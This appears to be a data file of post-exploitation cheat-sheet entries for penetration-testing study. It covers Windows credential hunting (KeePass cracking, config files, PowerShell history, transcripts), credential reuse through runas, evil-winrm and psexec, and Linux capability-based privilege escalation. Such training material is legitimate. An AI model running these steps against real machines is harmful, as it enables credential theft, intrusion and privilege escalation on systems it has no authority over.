Get-NetTCPConnection | Where-Object { $_.State -eq 'Established' }

TIME ESTIMATE: <1 second","high","","","","{""Too much output"": ""Many connections. Solution: netstat -ano | findstr LISTENING for services only. Or netstat -ano | findstr ESTABLISHED for active connections."", ""Need to identify process"": ""Know PID but not process name. Solution: tasklist /fi \""PID eq <pid>\"" to get process name."", ""Want process names directly"": ""Use netstat -anb (requires admin). Or combine: netstat -ano | findstr :80 to find port 80 PID, then tasklist /fi \""pid eq <pid>\"".""}","{""-a"": ""Display ALL connections and listening ports. Without this, only shows established connections. Critical for finding services that may be exploitable."", ""-n"": ""Numeric form - shows IP addresses instead of hostnames. Faster output, avoids DNS lookups, and shows exact IPs."", ""-o"": ""Shows owning Process ID (PID) for each connection. Use with tasklist to identify which process owns each connection. Critical for understanding what's running.""}","[""win-ipconfig-all""]","","[""ps-get-process""]"
"ps-get-installed-apps","Get Installed Applications - Registry Query","post-exploit","Get-ItemProperty ""HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"" | select displayname; Get-ItemProperty ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*"" | select displayname","Query Windows registry to list all installed 32-bit and 64-bit applications. Essential for identifying exploitable software, password managers, and sensitive applications.","application-enumeration","","Identify installed software for exploit research and credential opportunities.

**HIGH-VALUE APPLICATIONS:**

Password Managers:
- KeePass Password Safe - Database file contains all passwords
- LastPass - May have cached credentials
- 1Password - Check for local vaults

FTP/SSH Clients (stored credentials):
- FileZilla - XML config stores base64 encoded passwords
- WinSCP - Registry stores encrypted passwords
- PuTTY - Saved sessions may have credentials

Databases:
- MySQL/XAMPP - Check for config files with passwords
- MSSQL - Check for weak SA password
- PostgreSQL - Config file credentials

Development Tools:
- Visual Studio - May have Azure/cloud credentials
- Git - .git-credentials file
- Docker - Access to containers

Remote Access:
- TeamViewer - ID for connection
- AnyDesk - May have saved credentials
- VNC - Password files

**AFTER FINDING APPLICATIONS:**
1. Note versions for exploit search
2. Check install directories for config files
3. Search for known credential locations
4. Look for running processes

**MANUAL ALTERNATIVES:**

PowerShell (both architectures):
Get-ItemProperty ""HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*"" | select displayname
Get-ItemProperty ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*"" | select displayname

With versions:
Get-ItemProperty ""HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*"" | select displayname, displayversion

CMD (slow but works):
wmic product get name,version

Manual directory check:
dir ""C:\Program Files\""
dir ""C:\Program Files (x86)\""

Downloads folder (recent installations):
dir C:\Users\%USERNAME%\Downloads\

TIME ESTIMATE: 2-5 seconds","high","","","","{""Output incomplete or missing apps"": ""Some apps install differently. Solution: Also check C:\\Program Files\\ and C:\\Program Files (x86)\\ directories manually."", ""PowerShell blocked"": ""Use cmd alternative. Solution: reg query \""HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\"" /s | findstr DisplayName"", ""Need version numbers"": ""Add displayversion to select. Solution: Get-ItemProperty ... | select displayname, displayversion""}","{""HKLM:\\SOFTWARE\\Wow6432Node\\...\\Uninstall\\*"": ""Registry path for 32-bit applications on 64-bit Windows. Wow6432Node is the Windows-on-Windows 64-bit compatibility layer where 32-bit app info is stored."", ""HKLM:\\SOFTWARE\\Microsoft\\...\\Uninstall\\*"": ""Registry path for 64-bit (native) applications. Contains application metadata including DisplayName, DisplayVersion, Publisher."", ""select displayname"": ""Filter output to show only application names. Makes output readable. Can also use select displayname, displayversion for versions.""}","","","[""ps-get-process""]"
"ps-get-process","Get-Process - Running Processes","post-exploit","Get-Process","List all running processes with resource usage information. Essential for identifying running services, security software, and potential attack targets.","process-enumeration","","Identify interesting processes for exploitation and credential theft.

**HIGH-VALUE PROCESSES:**

Web Servers:
- httpd, apache - Apache web server
- w3wp - IIS worker process
- nginx - Nginx web server

Databases:
- mysqld - MySQL database
- sqlservr - Microsoft SQL Server
- postgres - PostgreSQL

Password Managers:
- KeePass, KeePassXC - May have unlocked database
- 1password - May have unlocked vault

Credential Targets:
- lsass - LSASS (dump for credentials)
- powershell - May have credentials in memory

Security Software (obstacles):
- MsMpEng - Windows Defender
- ccSvcHst - Symantec
- mbam* - Malwarebytes

**CORRELATING WITH NETSTAT:**
1. netstat -ano shows PID for listening port
2. Get-Process -Id <PID> identifies the process
3. Research the process for exploitation

**EXAMPLE:**
netstat: TCP 0.0.0.0:80 LISTENING 3340
Get-Process -Id 3340
# Result: httpd (Apache)

**MANUAL ALTERNATIVES:**

Basic list:
Get-Process

With paths:
Get-Process | Select-Object ProcessName, Path, Id

Find by name:
Get-Process -Name *mysql*
Get-Process | Where-Object { $_.ProcessName -like '*http*' }

Find by PID:
Get-Process -Id 3340

CMD alternative:
tasklist
tasklist /v (verbose)
tasklist /fi ""imagename eq httpd.exe""

Find process owner:
Get-Process -IncludeUserName

TIME ESTIMATE: <1 second","high","","","","{""Need to find specific process"": ""Use filtering. Solution: Get-Process -Name httpd or Get-Process | Where-Object { $_.ProcessName -like '*sql*' }"", ""Need full path of executable"": ""Use additional property. Solution: Get-Process | Select-Object ProcessName, Path"", ""PowerShell blocked"": ""Use cmd alternative. Solution: tasklist /v""}","{""Get-Process"": ""PowerShell cmdlet that lists all running processes. Shows: Process name, CPU usage, Memory usage (private working set), and Process ID. More detailed than tasklist with better filtering capabilities. Use to correlate with netstat output (PID) and identify interesting processes.""}","","","[""win-netstat-ano""]"
"ps-search-kdbx","Search for KeePass Databases","post-exploit","Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue","Recursively search entire C: drive for KeePass password database files (.kdbx). These files contain encrypted passwords that can be cracked or accessed if master password is found.","sensitive-information","","KeePass is a popular password manager. Finding .kdbx file is gold mine if you can crack/access it.

**EXPLOITATION PATH:**
1. Find .kdbx file
2. Transfer to Kali
3. Extract hash: keepass2john database.kdbx > hash.txt
4. Crack with hashcat: hashcat -m 13400 hash.txt wordlist.txt
5. Open database with master password

**RELATED FILE SEARCHES:**

KeePass databases:
Get-ChildItem -Path C:\ -Include *.kdbx,*.kdb -Recurse -ErrorAction SilentlyContinue

Key files (used with master password):
Get-ChildItem -Path C:\ -Include *.key,*.keyx -Recurse -ErrorAction SilentlyContinue

KeePass config (may reveal recent databases):
Get-ChildItem -Path C:\ -Include KeePass.config.xml -Recurse -ErrorAction SilentlyContinue

**CMD ALTERNATIVE:**
dir /s /b C:\*.kdbx

**COMMON LOCATIONS:**
- C:\Users\<user>\Documents\Passwords.kdbx
- C:\Users\<user>\Desktop\*.kdbx
- C:\Users\<user>\Dropbox\*.kdbx
- C:\Users\<user>\OneDrive\*.kdbx

TIME ESTIMATE: 1-5 minutes (full drive), 10-30 seconds (user folders)","high","","","","{""Search takes too long"": ""Full drive search is slow. Solution: Search user directories only: Get-ChildItem -Path C:\\Users\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue"", ""No results"": ""No KeePass databases or file extension different. Solution: Try broader search: Get-ChildItem -Path C:\\Users\\ -Include *.kdb,*.kdbx -Recurse -ErrorAction SilentlyContinue"", ""Found database but can't crack"": ""Need master password. Solution: Search for .key files (key files), check notes/documents for master password, try user's other passwords.""}","{""-Path C:\\"": ""Starting directory for recursive search. C:\\ searches entire drive. Can narrow to C:\\Users\\ for faster search."", ""-Include *.kdbx"": ""Filter for KeePass database file extension. KeePass 2.x uses .kdbx format. KeePass 1.x used .kdb (less common)."", ""-File"": ""Only return files, not directories. Prevents false matches on directory names."", ""-Recurse"": ""Search all subdirectories recursively. Required to find files anywhere on the system."", ""-ErrorAction SilentlyContinue"": ""Suppress access denied errors for directories user cannot read. Keeps output clean.""}","[""ps-get-installed-apps""]","",""
"ps-search-config-files","Search for Configuration Files with Credentials","post-exploit","Get-ChildItem -Path C:\xampp -Include *.txt,*.ini -File -Recurse -ErrorAction SilentlyContinue","Search application directories for configuration files that may contain plaintext credentials. XAMPP, web apps, and databases often store passwords in config files.","sensitive-information","","Configuration files frequently contain plaintext passwords. Search application directories identified in earlier enumeration.

**HIGH-VALUE TARGETS:**

XAMPP:
C:\xampp\passwords.txt - Default passwords
C:\xampp\mysql\bin\my.ini - MySQL config
C:\xampp\phpMyAdmin\config.inc.php - phpMyAdmin

WAMP:
C:\wamp\mysql\bin\my.ini
C:\wamp\apps\phpmyadmin*\config.inc.php

IIS:
C:\inetpub\wwwroot\web.config - Database connection strings
C:\Windows\System32\inetsrv\config\applicationHost.config

FTP Servers:
C:\Program Files\FileZilla Server\FileZilla Server.xml
C:\Program Files (x86)\FileZilla Server\FileZilla Server.xml

VNC:
C:\Program Files\RealVNC\VNC Server\config.txt
C:\Program Files\UltraVNC\ultravnc.ini

**COMPREHENSIVE SEARCH:**

All config files:
Get-ChildItem -Path C:\ -Include *.ini,*.config,*.xml,*.cfg -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.FullName -notlike '*Windows*' }

Search file contents for password:
Get-ChildItem -Path C:\Users\ -Include *.txt,*.xml,*.config -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern 'password' -SimpleMatch

**CMD ALTERNATIVE:**
dir /s /b C:\xampp\*.txt C:\xampp\*.ini
findstr /si password C:\xampp\*.ini C:\xampp\*.xml

TIME ESTIMATE: 10-60 seconds per directory","high","","","","{""XAMPP not installed"": ""Search other common locations. Solution: Try C:\\inetpub\\wwwroot for IIS, C:\\wamp for WAMP, or application-specific directories."", ""Found files but need to read"": ""Use type or Get-Content. Solution: type C:\\xampp\\mysql\\bin\\my.ini or Get-Content C:\\xampp\\passwords.txt"", ""Too many results"": ""Narrow search with more specific patterns. Solution: Get-ChildItem -Path C:\\xampp -Include *password*,*config* -Recurse""}","{""-Path C:\\xampp"": ""Target directory for search. Change based on installed applications (e.g., C:\\inetpub, C:\\wamp, C:\\Program Files\\MySQL)."", ""-Include *.txt,*.ini"": ""File extensions commonly containing credentials. Add *.xml,*.config,*.cfg for broader search."", ""-File"": ""Only return files, not directories."", ""-Recurse"": ""Search all subdirectories."", ""-ErrorAction SilentlyContinue"": ""Suppress permission errors.""}","[""ps-get-installed-apps""]","",""
"ps-search-user-docs","Search User Documents for Sensitive Files","post-exploit","Get-ChildItem -Path C:\Users\<USERNAME>\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue","Search user's home directory for documents that may contain passwords or sensitive information. Users often store passwords in text files, notes, or spreadsheets.","sensitive-information","Get-ChildItem -Path C:\Users\dave\ -Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue","Users frequently store passwords in plain text files. The laziness factor is real - never underestimate it!

**HIGH-VALUE LOCATIONS:**

Desktop (quick access, often contains notes):
C:\Users\<user>\Desktop\*.txt

Documents (formal storage):
C:\Users\<user>\Documents\*.xlsx

Downloads (recent activity):
C:\Users\<user>\Downloads\*

**COMMON PASSWORD FILE NAMES:**
- passwords.txt
- pass.txt
- creds.txt
- logins.txt
- notes.txt
- asdf.txt (random name, often contains sensitive info)
- todo.txt
- meeting_notes.txt

**SEARCH PATTERNS:**

Current user:
Get-ChildItem -Path $env:USERPROFILE -Include *.txt,*.pdf -Recurse -ErrorAction SilentlyContinue

All users:
Get-ChildItem -Path C:\Users\ -Include *.txt -Recurse -ErrorAction SilentlyContinue

Password-related names:
Get-ChildItem -Path C:\Users\ -Include *pass*,*cred*,*secret*,*login* -Recurse -ErrorAction SilentlyContinue

Search inside files:
Get-ChildItem -Path C:\Users\dave\ -Include *.txt -Recurse -ErrorAction SilentlyContinue | Select-String -Pattern 'password' -SimpleMatch

**CMD ALTERNATIVE:**
dir /s /b C:\Users\dave\Desktop\*.txt
findstr /si password C:\Users\dave\Desktop\*.txt

**READING FOUND FILES:**
type C:\Users\dave\Desktop\asdf.txt
Get-Content C:\Users\dave\Desktop\notes.txt

TIME ESTIMATE: 10-60 seconds per user","high","","","","{""Access denied to other user's folder"": ""Insufficient permissions. Solution: Search current user's folder first: Get-ChildItem -Path $env:USERPROFILE -Include *.txt -Recurse -ErrorAction SilentlyContinue"", ""Too many results"": ""Filter by name pattern. Solution: Get-ChildItem -Path C:\\Users\\dave\\ -Include *password*,*cred*,*secret*,*note* -Recurse"", ""Need to search all users"": ""Loop through users. Solution: Get-ChildItem -Path C:\\Users\\ -Include *.txt -Recurse -ErrorAction SilentlyContinue""}","{""-Path C:\\Users\\<USERNAME>\\"": ""User's home directory. Replace with actual username. For current user: $env:USERPROFILE or C:\\Users\\$env:USERNAME\\"", ""-Include *.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx"": ""Common document types. Text files often contain notes/passwords. Excel may have password lists. Word may have credentials in documentation."", ""-File"": ""Only return files, not directories."", ""-Recurse"": ""Search Desktop, Documents, Downloads, and all subdirectories."", ""-ErrorAction SilentlyContinue"": ""Suppress permission errors.""}","[""ps-get-localuser""]","",""
"ps-get-history","Get-History - PowerShell Session History","post-exploit","Get-History","Display PowerShell command history for current session. Note: This only shows current session - use PSReadline history for persistent history across sessions.","powershell-artifacts","","CRITICAL OSCP KNOWLEDGE: Get-History and PSReadline are DIFFERENT!

**Get-History:**
- Current session only
- Stored in memory
- Lost when PowerShell closes
- Cleared by Clear-History

**PSReadline (ConsoleHost_history.txt):**
- Persists across ALL sessions
- Stored in file on disk
- NOT cleared by Clear-History
- Contains commands from weeks/months ago

**ATTACK IMPLICATION:**
Admins often run Clear-History thinking they've removed traces.
They haven't - PSReadline still has everything!

**WHAT TO LOOK FOR:**
- Passwords typed in commands
- net use with credentials
- psexec with credentials
- Invoke-Command with credentials
- Set-Secret (password manager)
- ConvertTo-SecureString with passwords

**EXAMPLE GOLD:**
$password = ConvertTo-SecureString ""MyP@ssw0rd"" -AsPlainText -Force
net use \\server\share /user:admin password123
Enter-PSSession -ComputerName DC01 -Credential $cred

TIME ESTIMATE: <1 second","high","","","","{""Empty output"": ""New session or Clear-History was run. Solution: Check PSReadline history which persists across sessions: (Get-PSReadlineOption).HistorySavePath"", ""Only shows recent commands"": ""Get-History has limited buffer. Solution: Get-History -Count 1000 for more commands. Or check PSReadline file for complete history."", ""User ran Clear-History"": ""Clear-History only clears Get-History, NOT PSReadline. Solution: Always check PSReadline: type (Get-PSReadlineOption).HistorySavePath""}","{""Get-History"": ""PowerShell cmdlet that displays command history for the CURRENT SESSION ONLY. This history is stored in memory and lost when session closes. For persistent history (commands from previous sessions), check PSReadline history file. Users often clear this with Clear-History, thinking it removes all traces - it doesn't affect PSReadline.""}","","","[""ps-get-psreadline-path""]"
"ps-get-psreadline-path","Get PSReadline History File Path","post-exploit","(Get-PSReadlineOption).HistorySavePath","Display the path to PSReadline's persistent history file. This file contains ALL PowerShell commands across all sessions and is NOT cleared by Clear-History.","powershell-artifacts","","PSReadline history is GOLD MINE for credentials. Always check it!

**DEFAULT PATHS:**

PowerShell 5.x:
C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

PowerShell 7.x:
C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

**CHECK MULTIPLE USERS:**
For each user found in enumeration, check their history file.

**QUICK ACCESS:**

Current user:
(Get-PSReadlineOption).HistorySavePath

Direct path (current user):
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

Other user (manual):
C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

**CMD ALTERNATIVE:**
echo %APPDATA%\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

TIME ESTIMATE: <1 second","high","","","","{""Command not recognized"": ""PSReadline not installed (unusual). Solution: Manual path: C:\\Users\\%USERNAME%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"", ""History disabled"": ""Admin set HistorySaveStyle to SaveNothing. Solution: Path still exists but file may be empty. Check anyway."", ""Need to check other users"": ""Path is user-specific. Solution: Replace username in path: C:\\Users\\steve\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt""}","{""(Get-PSReadlineOption)"": ""Returns PSReadline module options including history settings. Wrapping in parentheses allows property access."", "".HistorySavePath"": ""Property containing the full path to the history file. Default: C:\\Users\\<user>\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt""}","[""ps-get-history""]","","[""ps-read-psreadline""]"
"ps-read-psreadline","Read PSReadline History File","post-exploit","type C:\Users\<USERNAME>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt","Display contents of PSReadline history file containing ALL PowerShell commands from all previous sessions. Often contains plaintext credentials and sensitive commands.","powershell-artifacts","type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt","This is where you find credentials that admins thought they deleted!

**WHAT TO LOOK FOR:**

Credential creation:
$password = ConvertTo-SecureString ""qwertqwertqwert123!!"" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential(""daveadmin"", $password)
# JACKPOT! Username and password in plaintext

Remote connections:
Enter-PSSession -ComputerName DC01 -Credential $cred
Invoke-Command -ComputerName SERVER01 -Credential $cred -ScriptBlock {...}
# Reveals target systems and indicates lateral movement

Secret management:
Set-Secret -Name ""Server02 Admin PW"" -Secret ""paperEarMonitor33@"" -Vault pwmanager
# Password manager entries

Network connections:
net use \\192.168.1.100\share /user:domain\admin P@ssw0rd
# SMB authentication with plaintext creds

Transcription evidence:
Start-Transcript -Path ""C:\Users\Public\Transcripts\transcript01.txt""
# Reveals transcript file locations!

**EXAMPLE ATTACK FLOW:**
1. Read PSReadline history
2. Find PSCredential creation with password
3. Use same credentials to authenticate
4. Privilege escalation achieved!

**READ MULTIPLE USERS:**

Current user:
type $env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

Specific user:
type C:\Users\dave\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

All users (requires elevated privs):
Get-ChildItem C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt | ForEach-Object { Write-Host ""`n=== $($_.FullName) ===""; Get-Content $_ }

TIME ESTIMATE: <1 second per file","high","","","","{""Access denied to other user"": ""Need elevated privileges. Solution: Read current user's history first. After privilege escalation, read other users' histories."", ""File not found"": ""User may not have used PowerShell or path is wrong. Solution: Verify path with (Get-PSReadlineOption).HistorySavePath or manually check if folder exists."", ""History disabled or cleared"": ""Admin may have configured PSReadline to not save history. Solution: Check if Start-Transcript was used for other logs.""}","{""type"": ""Windows command to display file contents. Alias for Get-Content in PowerShell. Can also use cat (PowerShell alias) or Get-Content."", ""ConsoleHost_history.txt"": ""PSReadline's persistent history file. Contains ALL commands from ALL PowerShell sessions. Survives Clear-History, reboots, and session closures.""}","[""ps-get-psreadline-path""]","","[""ps-search-transcripts""]"
"ps-search-transcripts","Search for PowerShell Transcript Files","post-exploit","Get-ChildItem -Path C:\Users\ -Include *transcript*,*PowerShell_transcript* -File -Recurse -ErrorAction SilentlyContinue","Search for PowerShell transcription log files. When enabled, transcripts record all commands and output, often containing credentials and sensitive information.","powershell-artifacts","","PowerShell Transcription is 'over-the-shoulder logging' - records everything as if watching the user.

**TRANSCRIPTION vs HISTORY:**

PSReadline History:
- Just commands typed
- No output recorded
- File-based, single location

Transcription:
- Commands AND their output
- Shows what user saw
- Can include credentials in output
- Multiple files per session

**COMMON TRANSCRIPT LOCATIONS:**

User-initiated:
C:\Users\<user>\Desktop\transcript*.txt
C:\Users\<user>\Documents\transcript*.txt

Centralized:
C:\Users\Public\Transcripts\
C:\Transcripts\
\\server\logs\transcripts\

GPO-enforced (enterprise):
C:\ProgramData\PowerShellTranscripts\

**TRANSCRIPT FILE CONTENTS:**

**********************
Windows PowerShell transcript start
Start time: 20220623081143
Username: CLIENTWK220\dave
Machine: CLIENTWK220
**********************
PS C:\Users\dave> $password = ConvertTo-SecureString ""qwertqwertqwert123!!"" -AsPlainText -Force
PS C:\Users\dave> $cred = New-Object System.Management.Automation.PSCredential(""daveadmin"", $password)
PS C:\Users\dave> Enter-PSSession -ComputerName CLIENTWK220 -Credential $cred
**********************
Windows PowerShell transcript end
**********************

**SEARCH COMMANDS:**

User directories:
Get-ChildItem -Path C:\Users\ -Include *transcript* -Recurse -ErrorAction SilentlyContinue

Public folder:
Get-ChildItem -Path C:\Users\Public\ -Include *transcript* -Recurse -ErrorAction SilentlyContinue

Entire drive:
Get-ChildItem -Path C:\ -Include *transcript*.txt -Recurse -ErrorAction SilentlyContinue

**CMD ALTERNATIVE:**
dir /s /b C:\*transcript*.txt

TIME ESTIMATE: 10-60 seconds","high","","","","{""No transcripts found"": ""Transcription may not be enabled. Solution: Check if PSReadline history was found instead - that's more common. Also try: Get-ChildItem -Path C:\\ -Include *transcript*.txt -Recurse -ErrorAction SilentlyContinue"", ""Found transcript but can't read"": ""Permission denied. Solution: Note path and try after privilege escalation."", ""Looking for central storage"": ""Enterprises may store transcripts centrally. Solution: Check C:\\Transcripts, \\\\server\\logs, etc.""}","{""-Path C:\\Users\\"": ""Starting directory. Transcripts are often saved in user directories or C:\\Users\\Public\\."", ""-Include *transcript*,*PowerShell_transcript*"": ""Search patterns for transcript files. PowerShell default naming includes 'PowerShell_transcript' prefix."", ""-File"": ""Only return files, not directories."", ""-Recurse"": ""Search all subdirectories."", ""-ErrorAction SilentlyContinue"": ""Suppress access denied errors.""}","[""ps-read-psreadline""]","",""
"win-runas-cmd","Runas - Run Command as Different User","post-exploit","runas /user:<USERNAME> cmd","Execute cmd.exe as a different user. Use after finding credentials in files or history to test if they work and gain access as that user.","credential-leveraging","runas /user:backupadmin cmd","CRITICAL: runas requires INTERACTIVE GUI session. Won't work in bind/reverse shells!

**WHEN TO USE runas:**
- You have RDP access
- You found credentials in files/history
- Target user is local admin or has elevated privileges

**WHEN TO USE ALTERNATIVES:**
- No GUI: Use evil-winrm, Invoke-Command, or PsExec
- Domain user: Use Invoke-Command with PSCredential
- Need SYSTEM: Use PsExec -s

**COMMON PATTERNS:**

Local user:
runas /user:backupadmin cmd
runas /user:daveadmin powershell

Explicit local (same machine):
runas /user:CLIENTWK220\backupadmin cmd

Domain user:
runas /user:CORP\administrator cmd

Run specific program:
runas /user:admin ""C:\Program Files\app.exe""

**ALTERNATIVES FOR NON-INTERACTIVE SHELLS:**

evil-winrm (from Kali):
evil-winrm -i 192.168.50.220 -u daveadmin -p ""qwertqwertqwert123!!""

PowerShell (WinRM):
$password = ConvertTo-SecureString ""password"" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential(""user"", $password)
Invoke-Command -ComputerName localhost -Credential $cred -ScriptBlock {whoami}

PsExec (local):
psexec.exe -u administrator -p password cmd.exe

**AFTER SUCCESSFUL runas:**
1. Verify with whoami
2. Check group memberships with whoami /groups
3. If admin, proceed with post-exploitation
4. If not admin, continue enumeration from new context

TIME ESTIMATE: <1 second (plus password entry)","high","","","","{""Password prompt not appearing"": ""Running in non-interactive shell (bind shell, reverse shell, WinRM). Solution: runas requires interactive GUI session. Use evil-winrm or PowerShell remoting instead."", ""User name or password incorrect"": ""Wrong credentials. Solution: Verify password, try variations (case-sensitive). Try both username and HOSTNAME\\username formats."", ""Account disabled"": ""Target account is disabled. Solution: Cannot use runas for disabled accounts. Try other users or enable account if you have permission."", ""Access denied"": ""May need SeNetworkLogonRight. Solution: Check if user can log on interactively. Try other authentication methods.""}","{""/user:<USERNAME>"": ""Specifies the user account to run the program as. Format can be: username (local), HOSTNAME\\username (explicit local), or DOMAIN\\username (domain). You will be prompted for the password interactively."", ""cmd"": ""The program to run as the specified user. Can be any executable. Common choices: cmd (command prompt), powershell (PowerShell), or direct program paths.""}","","[""evil-winrm-shell"", ""ps-winrm-credential-setup""]",""
"enumerate-capabilities","Enumerate Linux File Capabilities","post-exploit","getcap -r / 2>/dev/null","Recursively enumerate all binaries with Linux file capabilities set. Capabilities are kernel features that grant specific elevated permissions without requiring full SUID root. This discovers potential privilege escalation vectors by locating binaries with dangerous capabilities like cap_setuid or cap_dac_override.","privilege-escalation","","Capabilities notation:
+ep means Effective and Permitted (capability is active).

=eip means Effective, Inheritable, and Permitted (full capability inheritance).

Comma-separated capabilities possible:
cap_net_admin,cap_net_raw+ep.

Network capabilities (cap_net_raw, cap_net_admin) are non-exploitable for privesc.

Empty output is normal on hardened systems without capability-based binaries.

Faster than full SUID enumeration as fewer binaries typically have capabilities.","High - Modern alternative to SUID often missed in basic enumeration. Critical for complete privilege escalation coverage on Linux targets with capabilities-enabled binaries.","","","","{""getcap: command not found"": ""Install libcap: apt-get install libcap2-bin (Debian/Ubuntu) or yum install libcap (RedHat/CentOS)"", ""No output returned"": ""System may not have any capabilities set. This is common on minimal installations. Try checking /usr/bin and /usr/sbin specifically."", ""Permission denied for all paths"": ""Run from directories with read access, or focus on /usr/bin, /usr/local/bin where capabilities are commonly set"", ""Output format unclear"": ""Capabilities shown as cap_name+ep mean: +e (effective), +p (permitted). Both together indicate capability is active.""}","{""-r"": ""Recursive: Search through directories recursively from the specified path (/ for entire filesystem). Required to enumerate all binaries system-wide."", ""/"": ""Starting path: Begin search from root directory to cover entire filesystem. Can be changed to specific directory (e.g., /usr/bin) for faster targeted search."", ""2>/dev/null"": ""Error suppression: Redirect stderr (file descriptor 2) to /dev/null to hide 'Permission denied' errors from inaccessible directories. Makes output cleaner and easier to parse.""}","","",""
"filter-exploitable-caps","Filter Exploitable Capabilities","post-exploit","# Manual analysis - filter getcap output for dangerous capabilities
# CRITICAL: cap_setuid, cap_dac_override, cap_sys_admin, cap_sys_ptrace
# HIGH: cap_dac_read_search, cap_setgid, cap_chown, cap_fowner
# NON-EXPLOITABLE: cap_net_raw, cap_net_admin (network only)","Analyze getcap enumeration output to identify dangerous capabilities that enable privilege escalation. Focus on critical capabilities: cap_setuid (spawn root shell), cap_dac_override (bypass file permissions for write), cap_dac_read_search (bypass read permissions), cap_sys_admin (mount filesystems), cap_sys_ptrace (inject code). Ignore network-only capabilities.","privilege-escalation","","CRITICAL CAPABILITIES - Direct root access:

cap_setuid:
Change process UID to 0 (root shell).

cap_dac_override:
Bypass all file permission checks (write any file).

cap_sys_admin:
Full system administration (mount, namespace manipulation).

cap_sys_ptrace:
Trace any process (inject shellcode into root process).

HIGH SEVERITY CAPABILITIES - Sensitive data access:

cap_dac_read_search:
Bypass read permission checks (shadow, SSH keys).

cap_setgid:
Change GID to root group.

cap_chown:
Change file ownership (chown /etc/passwd to gain write).

cap_fowner:
Bypass permission checks for file operations.

NON-EXPLOITABLE FOR PRIVESC:

cap_net_raw, cap_net_admin:
Network packet manipulation only.

cap_net_bind_service:
Bind to privileged ports <1024.","High - Correctly identifying exploitable capabilities vs. noise is critical. Many systems have network capabilities (non-exploitable) that can waste time if not filtered.","","","","{""Only network capabilities found"": ""System may be hardened. Check SUID binaries instead: find / -perm -4000 2>/dev/null"", ""Unclear which capabilities are exploitable"": ""Consult GTFOBins capabilities filter: https://gtfobins.github.io/#+capabilities"", ""Binary not in GTFOBins"": ""Research capability function in man 7 capabilities. cap_setuid and cap_dac_override are almost always exploitable.""}","","","",""
"gtfobins-cap-lookup","GTFOBins Capabilities Lookup","post-exploit","# Manual lookup process:
# 1. Visit https://gtfobins.github.io/
# 2. Use filter: Click 'Capabilities' checkbox
# 3. Search for binary name (python, vim, tar, etc.)
# 4. Note exact command syntax with capability requirements
# Alternative: https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities","Research documented exploitation techniques for identified capability/binary combinations using GTFOBins or HackTricks. GTFOBins provides exact command syntax for exploiting capabilities on common Unix binaries. Each capability type requires different exploitation approach based on what privileged operation it enables.","privilege-escalation","","COMMON GTFOBINS CAPABILITY EXPLOITS:

cap_setuid exploitation:

- python/perl/ruby:
Use setuid(0) syscall then spawn shell.

- php:
posix_setuid(0) then system('/bin/bash').

- node:
process.setuid(0) then require('child_process').spawn('/bin/bash').

cap_dac_override exploitation:

- vim/nano:
Open /etc/passwd, add user with UID 0.

- tar:
Create archive with modified /etc/passwd, extract to overwrite.

- cp:
Copy /etc/passwd to /tmp, modify, copy back.

cap_dac_read_search exploitation:

- tar:
Archive sensitive files (shadow, SSH keys) for exfiltration.

- base64:
Encode and exfiltrate /etc/shadow or root SSH keys.

- od/xxd:
Dump binary files like /etc/shadow.

cap_sys_ptrace exploitation:

- gdb:
Attach to root process, inject shellcode.

- strace:
Trace root process, potentially inject.

cap_sys_admin exploitation:

- mount:
Mount privileged filesystem or overlay /etc.

GTFOBins capabilities filter is most reliable source for exact syntax.","Critical - GTFOBins is essential reference for OSCP. Capabilities section less commonly known but highly effective when encountered. Memorize common patterns for interpreters (setuid) and editors (dac_override).","","","","{""Binary not in GTFOBins"": ""Check if binary is symlink to documented binary (python3.8 -> python). Try HackTricks for more comprehensive coverage."", ""Multiple techniques available"": ""Start with simplest technique (usually first listed). For cap_setuid on python: os.setuid(0) approach is most reliable."", ""Technique syntax unclear"": ""Read GTFOBins 'Description' section for context. Look for similar binaries (python2 vs python3 techniques often identical).""}","","","",""
"execute-cap-exploit","Execute Capability Exploitation","post-exploit","# Command depends on capability type and binary:
# TEMPLATE: <CAP_BINARY> [capability-specific-arguments]
